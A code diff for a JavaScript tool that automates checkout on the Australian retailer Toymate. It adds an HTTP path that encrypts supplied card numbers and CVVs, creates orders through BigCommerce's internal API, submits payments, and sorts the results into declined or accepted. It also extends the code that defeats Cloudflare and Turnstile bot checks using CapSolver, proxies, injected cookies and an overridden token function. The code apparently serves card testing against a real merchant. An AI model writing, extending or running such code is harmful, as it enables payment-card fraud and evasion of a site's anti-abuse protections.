@@ -6,6 +6,8 @@ import forge from "node-forge";
 import {
   solveTurnstileChallenge,
   extractTurnstileSitekey,
+  solveCloudflareChallenge,
+  looksLikeCfChallenge,
   capsolverKey,
 } from "./toymate-cf-solve.js";
 
@@ -158,6 +160,190 @@ export function pickAdyenCardMethod(methods) {
     list.find((m) => /adyen/i.test(String(m.gateway || "")) && m?.method === "scheme") ||
     null
   );
+}
+
+/**
+ * HTTP place-order via BC internal order create + BigPay payments.
+ * Prefer this over Playwright when spam-protection has cleared (no CF Turnstile).
+ */
+export async function placeOrderViaHttp({
+  request,
+  ctx,
+  userAgent,
+  checkoutId,
+  card,
+  captchaToken = null,
+  profile = {},
+} = {}) {
+  const apex = "https://toymate.com.au";
+  const ua = userAgent || "Mozilla/5.0";
+  const jar = ctx?.jar;
+  const headers = storefrontPaymentHeaders(jar, ua, { accept: "application/json" });
+  const logs = [];
+
+  if (captchaToken) {
+    const spam = await request(
+      `${apex}/api/storefront/checkouts/${checkoutId}/spam-protection`,
+      {
+        method: "POST",
+        headers,
+        body: JSON.stringify({
+          spamProtection: { method: "recaptcha_v2", token: captchaToken },
+        }),
+      },
+      ctx,
+    );
+    const spamText = await spam.text().catch(() => "");
+    logs.push({ step: "spam", status: spam.status, body: spamText.slice(0, 160) });
+    if (!(spam.status >= 200 && spam.status < 300)) {
+      return {
+        ok: false,
+        declined: false,
+        note: `http spam ${spam.status}`,
+        paymentLogs: logs,
+      };
+    }
+  }
+
+  const methodsRes = await request(
+    `${apex}/api/storefront/payments?cartId=${checkoutId}`,
+    { headers: storefrontPaymentHeaders(jar, ua) },
+    ctx,
+  );
+  const methods = await methodsRes.json().catch(() => null);
+  const adyen = pickAdyenCardMethod(methods);
+  logs.push({
+    step: "methods",
+    status: methodsRes.status,
+    body: adyen ? `${adyen.gateway}/${adyen.id}` : "none",
+  });
+  if (!adyen) {
+    return { ok: false, declined: false, note: "http: no Adyen scheme", paymentLogs: logs };
+  }
+  const clientKey = adyen.initializationData?.clientKey || adyen.config?.clientKey;
+  if (!clientKey) {
+    return { ok: false, declined: false, note: "http: missing Adyen clientKey", paymentLogs: logs };
+  }
+
+  const encrypted = await encryptAdyenCard({
+    clientKey,
+    number: card.number,
+    expMonth: card.expMonth,
+    expYear: card.expYear,
+    cvv: card.cvv,
+    holder: card.holder || `${profile.first_name || "Test"} ${profile.last_name || "Buyer"}`,
+  });
+
+  // Create order (BC Optimized Checkout internal API).
+  const orderRes = await request(
+    `${apex}/internalapi/v1/checkout/order`,
+    {
+      method: "POST",
+      headers: {
+        ...headers,
+        accept: "application/json, text/plain, */*",
+        "x-requested-with": "XMLHttpRequest",
+      },
+      body: JSON.stringify({}),
+    },
+    ctx,
+  );
+  const orderText = await orderRes.text().catch(() => "");
+  logs.push({ step: "order_create", status: orderRes.status, body: orderText.slice(0, 240) });
+  if (!(orderRes.status >= 200 && orderRes.status < 300)) {
+    return {
+      ok: false,
+      declined: false,
+      note: `http order_create ${orderRes.status}`,
+      paymentLogs: logs,
+    };
+  }
+  let orderJson = null;
+  try {
+    orderJson = JSON.parse(orderText);
+  } catch {
+    /* ignore */
+  }
+  const orderId = orderJson?.data?.order?.orderId || orderJson?.orderId || orderJson?.id || null;
+  const payToken =
+    orderJson?.data?.order?.token ||
+    orderJson?.data?.token ||
+    orderJson?.token ||
+    orderJson?.payment?.token ||
+    null;
+
+  const payHeaders = {
+    "user-agent": ua,
+    accept: "application/json",
+    "content-type": "application/json",
+    origin: apex,
+    referer: `${apex}/checkout`,
+  };
+  // Prefer PAT-only for BigPay when we have a payment token.
+  if (payToken) payHeaders.Authorization = `PAT ${payToken}`;
+
+  const payBody = {
+    payment: {
+      payment_method_id: `${adyen.gateway}.${adyen.id}`,
+      methodId: adyen.id,
+      gatewayId: adyen.gateway,
+      ...(orderId ? { orderId: String(orderId) } : {}),
+      paymentData: JSON.stringify({
+        paymentMethod: encrypted,
+        browserInfo: browserInfo(),
+        clientStateDataIndicator: true,
+        origin: apex,
+      }),
+    },
+  };
+
+  const payRes = await request(
+    "https://payments.bigcommerce.com/api/public/v1/orders/payments",
+    {
+      method: "POST",
+      headers: payHeaders,
+      body: JSON.stringify(payBody),
+    },
+    ctx,
+  );
+  const payText = await payRes.text().catch(() => "");
+  logs.push({ step: "bigpay", status: payRes.status, body: payText.slice(0, 300) });
+
+  const declined =
+    /declin|refused|insufficient|invalid card|not enough|do not honour|payment_failed|"status"\s*:\s*"error"/i.test(
+      payText,
+    ) && !/unauthorized/i.test(payText);
+  const orderNumber =
+    payText.match(/order(?:_?(?:number|id))?["']?\s*:\s*["']?(\d{5,})/i)?.[1] ||
+    (orderId ? String(orderId) : null);
+
+  if (declined) {
+    return {
+      ok: true,
+      declined: true,
+      status: payRes.status,
+      note: payText.replace(/\s+/g, " ").slice(0, 180),
+      orderNumber: null,
+      paymentLogs: logs,
+    };
+  }
+  if (payRes.status >= 200 && payRes.status < 300) {
+    return {
+      ok: true,
+      declined: false,
+      status: payRes.status,
+      note: orderNumber ? `order ${orderNumber}` : `bigpay ${payRes.status}`,
+      orderNumber,
+      paymentLogs: logs,
+    };
+  }
+  return {
+    ok: false,
+    declined: false,
+    status: payRes.status,
+    note: `http pay ${payRes.status}: ${payText.replace(/\s+/g, " ").slice(0, 140)}`,
+    paymentLogs: logs,
+  };
 }
 
 async function dismissSpamModal(page) {
@@ -356,27 +542,80 @@ async function waitForAdyenFrames(page, { timeoutMs = 75_000, captchaToken = nul
  * Place order through BigCommerce checkout UI (Adyen secured fields).
  * Returns { ok, status, note, declined, orderNumber, body }.
  */
-async function clearPlaywrightTurnstile(page, context, { proxyUrl, userAgent, cookies } = {}) {
+async function applyContextCookies(context, cookieMap) {
+  if (!cookieMap || !Object.keys(cookieMap).length) return;
+  const jarCookies = Object.entries(cookieMap).map(([name, value]) => ({
+    name,
+    value: String(value),
+    domain: ".toymate.com.au",
+    path: "/",
+    httpOnly: false,
+    secure: true,
+    sameSite: "Lax",
+  }));
+  await context.addCookies(jarCookies);
+}
+
+async function clearPlaywrightTurnstile(page, context, { proxyUrl, userAgent } = {}) {
   const html = await page.content().catch(() => "");
   const body = await page.locator("body").innerText().catch(() => "");
-  const turnstile =
+  const challenged =
+    looksLikeCfChallenge(html, 403) ||
     /verify you are human|performing security verification|cf-turnstile|challenge-platform/i.test(
       body + html,
     );
-  if (!turnstile) return { ok: true, skipped: true };
+  if (!challenged) return { ok: true, skipped: true };
+  if (!capsolverKey()) {
+    return { ok: false, note: "Playwright CF challenge — CAPSOLVER_API_KEY missing" };
+  }
 
-  let sitekey = extractTurnstileSitekey(html);
-  if (!sitekey) {
-    sitekey = await page
+  // 1) Prefer AntiCloudflareTask on live challenge HTML (same path that clears undici).
+  const anti = await solveCloudflareChallenge({
+    pageUrl: page.url() || "https://toymate.com.au/checkout",
+    html,
+    proxyRaw: proxyUrl,
+    userAgent,
+  });
+  if (anti.ok) {
+    await applyContextCookies(context, anti.cookies);
+    if (anti.userAgent && anti.userAgent !== userAgent) {
+      // UA mismatch can't be changed mid-context; cookies alone often enough after reload.
+    }
+    await page.goto(page.url() || "https://toymate.com.au/checkout", {
+      waitUntil: "domcontentloaded",
+      timeout: 60_000,
+    }).catch(() => page.reload({ waitUntil: "domcontentloaded", timeout: 60_000 }));
+    await page.waitForTimeout(2500);
+    const bodyAnti = await page.locator("body").innerText().catch(() => "");
+    if (!/performing security verification|verify you are human/i.test(bodyAnti)) {
+      return { ok: true, note: "CF cleared via AntiCloudflareTask", via: "anti-cf" };
+    }
+  }
+
+  // 2) Turnstile token path — sitekey from DOM / CF opts after widgets render.
+  let sitekey =
+    extractTurnstileSitekey(html) ||
+    (await page
       .locator("[data-sitekey]")
       .first()
       .getAttribute("data-sitekey")
-      .catch(() => null);
+      .catch(() => null));
+  if (!sitekey) {
+    sitekey = await page.evaluate(() => {
+      try {
+        if (window._cf_chl_opt?.chlApiSitekey) return window._cf_chl_opt.chlApiSitekey;
+        if (window._cf_chl_opt?.sitekey) return window._cf_chl_opt.sitekey;
+      } catch {
+        /* ignore */
+      }
+      const el = document.querySelector("[data-sitekey]");
+      return el?.getAttribute("data-sitekey") || null;
+    });
   }
-  if (!sitekey || !capsolverKey()) {
+  if (!sitekey) {
     return {
       ok: false,
-      note: `Playwright CF Turnstile (sitekey=${sitekey || "missing"}; capsolver=${Boolean(capsolverKey())})`,
+      note: `Playwright CF uncleared (anti=${anti.error || anti.note || "fail"}; turnstile sitekey missing)`,
     };
   }
 
@@ -396,19 +635,7 @@ async function clearPlaywrightTurnstile(page, context, { proxyUrl, userAgent, co
   }
   if (!solved.ok) return { ok: false, note: solved.error || "Turnstile solve failed" };
 
-  if (solved.cookies && Object.keys(solved.cookies).length) {
-    const jarCookies = Object.entries(solved.cookies).map(([name, value]) => ({
-      name,
-      value: String(value),
-      domain: ".toymate.com.au",
-      path: "/",
-      httpOnly: false,
-      secure: true,
-      sameSite: "Lax",
-    }));
-    await context.addCookies(jarCookies);
-  }
-
+  await applyContextCookies(context, solved.cookies);
   if (solved.token) {
     await page.evaluate((tok) => {
       for (const el of document.querySelectorAll(
@@ -417,32 +644,7 @@ async function clearPlaywrightTurnstile(page, context, { proxyUrl, userAgent, co
         el.value = tok;
       }
       try {
-        if (window.turnstile?.getResponse) {
-          window.turnstile.getResponse = () => tok;
-        }
-      } catch {
-        /* ignore */
-      }
-      try {
-        const cfg = window.turnstile;
-        if (cfg?.ready) {
-          /* best-effort */
-        }
-      } catch {
-        /* ignore */
-      }
-      // Common CF callback pattern
-      try {
-        const w = window;
-        for (const k of Object.keys(w)) {
-          if (/^ts?_?callback|turnstile/i.test(k) && typeof w[k] === "function") {
-            try {
-              w[k](tok);
-            } catch {
-              /* ignore */
-            }
-          }
-        }
+        if (window.turnstile?.getResponse) window.turnstile.getResponse = () => tok;
       } catch {
         /* ignore */
       }
@@ -457,6 +659,7 @@ async function clearPlaywrightTurnstile(page, context, { proxyUrl, userAgent, co
     ok: !still,
     note: still ? "Turnstile still present after CapSolver" : "Turnstile cleared",
     sitekey,
+    via: "turnstile",
   };
 }
 
